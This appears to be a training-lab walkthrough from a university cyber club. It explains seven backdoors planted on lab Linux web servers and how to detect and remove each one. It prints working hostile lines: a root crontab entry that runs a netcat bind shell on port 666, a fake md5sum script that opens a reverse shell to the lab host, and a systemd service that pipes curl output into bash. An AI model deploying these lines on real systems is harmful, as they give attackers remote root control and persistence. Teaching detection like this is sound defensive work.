# Backdoor walkthough

This document goes through each of the backdoors present in
the web servers. Each backdoor is documented here, as well as some
basic forensic techniques that could be used to find these backdoors
on a live system.

A backdoor is a method that an attacker uses to bypass normal authentication
on a system. In the lab, the normal authentication is the SSH servers running
on each web linux host. Using the SSH server requires knowing the credentials
(which by default are `admin`/`cybersec$1`). By adding backdoors, the attackers
can get around the password requirement and control the server without knowing
the password to the admin account.

It is important to keep in mind that nothing can happen or be controlled on a Linux
server in a vacuum. Every possible backdoor relies on a system that was already in place.

## Backdoor 1

An ssh key in the root user's account allowed hackers to control the server
remotely via SSH and the root account.

### Base system
The base system used in this backdoor is the SSH server. This is the service
that allows you to control and administer the Linux hosts remotely (over the internet).

When you use SSH you must pick an account to login as. Logging in requires
a credential, because otherwise the servers running SSH could be controlled by anyone.
There are, roughly, three types of credentials you can use to login to an account.

1. A password - the simplest type of authentication
Passwords are stored in hashed in the file `/etc/shadow`.
2. An SSH key - basically a very long password that you store in a file on your system.
Any ssh keys that are allowed to access an account are stored in a user's home
directory, under the hidden folder `.ssh`. Note that the root user's home directory
on Linux is usually `/root`.
3. Multifactor Auth - Various libraries allow you to use multi factor authentication (like Google authenticator). This isn't set up by default.

Read more about OpenSSH:
- https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch01_01.htm
- https://www.digitalocean.com/community/tutorials/ssh-essentials-working-with-ssh-servers-clients-and-keys


### The backdoor
There is an ssh public key for the root account in the file `/root/.ssh/authorized_keys`. 
The corresponding private key is owned by the hackers, and they use it to access the root account.
To remove the key, simple delete the first line in the authorized keys file.

### How to find it
When on a Linux server you should always know who has recently used that server
and what they have been doing. Run the `last` command to see recent logins. If you
did this during the lab, you would notice some logins from the root user. Since you
aren't using the root account, you should know that this activity comes from another source.

Once you have determined that others are logging into the root account you should
check it out. First change the password, then check the authorized keys files.

### How to prevent it
The default configuration of OpenSSH on CentOS is pretty much garbage. For one,
the root user should never be allowed to use SSH. Prevent this by adding the line
`PermitRootLogin no` to the file /etc/ssh/sshd_config and then restarting the SSH
server (`systemctl restart ssh`).

## Backdoor 2

An extra account, called `very_important_account`, existed, giving hackers
SSH access to the server.

### Base system
Linux has many accounts for different services and users. You can see some basic
information about these accounts in the account configuration file, `/etc/passwd`.
Each account has a "login shell". This is the program that executes when a
user starts a new terminal (either on SSH or on the physical machine itself).

As before, the SSH server was utilized as an attack vector by the attackers.

More on user accounts
- https://www.cyberciti.biz/faq/linux-list-users-command/
- http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html

### The Backdoor

The evil account was created via a script. It had password-based access, so the 
attackers simply needed a password to login. The passord was "IAMAHACKER".

### How to find it

One a Linux system it is always important to know what users there are. The easiest
place to get information about users is the configuration file `/etc/passwd`

When looking at this file, you should see which accounts have a login shell and
which accounts do not. The login shell is the filename at the end of each line.
Most system accounts will have something like `/bin/false` or `/usr/sbin/nologin`
instead of an actual interactive shell program (like `/bin/bash` or `/bin/sh` (
run `cat /etc/shells` to see every shell available.)).

For each account that has a login shell, you should see if that account is necessary
and whether or not it is under your control.

### How to prevent it

Run `chsh -s /bin/false very_important_account` to change their shell.

## Backdoor 3

A program was listening on port 666. Attackers could connect to this port over TCP and
execute any command as root.

### Base system
Netcat is a utility for reading and writing data over a network using either
TCP or UDP. It is very useful for debugging stuff like SSH servers, HTTP servers,
MySQL servers, or just TCP and UDP in general. Running netcat with the `-l` argument
tells it to open a port and listen for incoming connections.

Crontab is a utility on most Unix systems that will start jobs or commands on a
regular, time based, interval. For instance, you could run a script to clean out
your Downloads folder every 2 hours, or a script to run updates every Friday, or
a script to pay your landlord on the first of every month. There are a few config
files that control Crontab, including `/etc/crontab` and every file in the folder
`/etc/cron.d`.

### The backdoor
A script in the root user's crontab started a netcat listener every minute.

### How to find it
You should always know what ports are open and listening on a Linux system. Run the
command `sudo ss -tulpn` to see very open port. If you did this during the lab you
would notice that port 666 is listening. This is weird. Further investigation
would have showed you the command that was starting the listener, and you should
have checked crontab at that point.

### How to prevent it
It was necessary to remove the crontab script that kept starting the listener.
Edit the file `/etc/crontab` and remove the line that read:
``` */1 * * * * root /usr/bin/nc -e /bin/bash -l 666 & ```

## Backdoor 4
The `md5sum` command was replaced by a malicious shell script that
started a reverse shell.

### Base system
Every command (more or less) that you run in a Linux terminal is actually
a program stored in an executable file. For instance, the `ls` command
is a compiled C program that lives in `/bin/ls`. To save typing, Linux
translates the command you type "ls" to the actual name of an executable file
"/bin/ls" by checking the `$PATH` environment variable. To look at the `$PATH`
variable youself run `echo $PATH`.

Executable files (misnomer: binaries) are stored in a few different folders in
a Linux system. These folders are checked in an order given by the contents of
`$PATH`. If you put an exe in a folder lower in the order, it will override
the upper folder, and replace the command.

### The backdoor
In Centos, the folder `/usr/local/sbin` is higher in the `$PATH` than
the folder `/usr/bin`, which is where `md5sum` is suppossed to live.

A file was created at `/usr/local/sbin/md5sum` with the following content:
```
#!/bin/bash
(nc -e /bin/bash $(dig +short web1.umcstlab.net) 4444 ) &>/dev/null &
/usr/bin/md5sum \$1
```

Netcat is used again for the actual shell, but this time it is making a connection,
instead of listening.

### How to find it
The process of verifying that executable files on your system have not been
replaced by malicious ones (which we like to call "checking your binaries")
is pretty difficult. The easiest solution is to use a tool like [rkhunter](http://rkhunter.sourceforge.net/).

This has been a problem that haunts computer science since the first computer
virus was created. Some systems use the concept of "signed code" to protect
againt program modification, but this is pretty rare.

### How to prevent it
Delete the replacement script (`sudo rm /usr/local/sbin/md5sum`).

## Backdoor 5
A malicious SystemD timer was created that downloaded and executed scripts
from the hacker's website.

### Base System
SystemD is a core part of Centos (and most other Linux distros) that manages
services like your SSH server and Nginx server. You interact with SystemD via the
`systemctl` and `journalctl` commands. One of SystemD's many features is the ability
to create "timers", which do basically the same thing as the crontab.

The `curl` command lets you download web pages via HTTP/HTTPS.

### The backdoor
The backdoor consisted of two SystemD config files.

/etc/systemd/system/cleanup.service
```
[Unit]
Description=Prints date into /tmp/date file

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/usr/bin/curl web1.umcstlab.net:8080/run.sh | /bin/bash"

```
/etc/systemd/system/cleanup.timer
```
[Unit]
Description=Import system configuration

[Timer]
OnCalendar=*:0/2

[Install]
WantedBy=timers.target
```

### How to find it
Finding this was a bit of a challenge because nobody really uses
SystemD timers for anything. You can see all the timers by running
`systemctl list-timers`. It is pretty unlikely that anyone would find this
without monitoring network traffic (`tcpdump`).

### How to prevent it
Stop and disable the systemD timer `sudo systemctl stop cleanup.timer && sudo systemctl disable cleanup.timer`.

## Backdoor 6
An existing system account for the FTP server was repurposed for use by the hackers.

### Base system
Since it's no longer 1983, most of our computers have only a single user.
On Linux, instead of using accounts for users accounts are often used for
services and applications. Most Linux distros come with a bunch of system accounts
enabled by default. The accounts aren't suppossed to be used by humans, only
by programs. They have no password and no login shell, which prevents their use.

### The Backdoor
The `ftp` account was given a login shell and a password.

### How to find this
Again, this could be spotted by looking at `/etc/passwd`.

### How to prevent this
Change the `ftp` user's login shell back to the default. Run `sudo chsh -s /bin/false ftp`.

## Backdoor 7

A malicious program was running that sent udp traffic to the Hacker's server
and ran any commands that hackers wanted.

### Base system
For our purposes, a shell is a program that allows a server to be controlled.
Most shells involve a user making a connection to them (like via SSH or even
via a monitor and keyboard). A reverse shell does the opposite, making a connection
from the server being controlled to a different server. For a reverse shell
many of you may be familiar with, see TeamViewer.

### The backdoor
This is code that Nick wrote to test firewalls. See 
https://github.com/Dieff/not-a-backdoor. The executable was an ELF binary
stored in `/tmp/yum_cleanup_script`.

### How to find this
When doing Linux security forensics, it is good to know what traffic is being
sent and recieved by the server. This backdoor sent out a huge amount of UDP
traffic every few seconds. If you monitored traffic, it would definitely be
an anomoly. To monitor traffic, use the `tcpdump` command.

Also, the `/tmp` folder is used to store temporary files (like downloads) and usually cleaned
out every few days (or on a reboot). Most of the time there is no reason for an
executable file to be running from this directory.

### How to prevent this
Simply kill the program with the `kill` command. Also, a firewall would help prevent
this sort of thing. We at UMCST like [nftables](https://wiki.nftables.org/wiki-nftables/index.php/Main_Page)
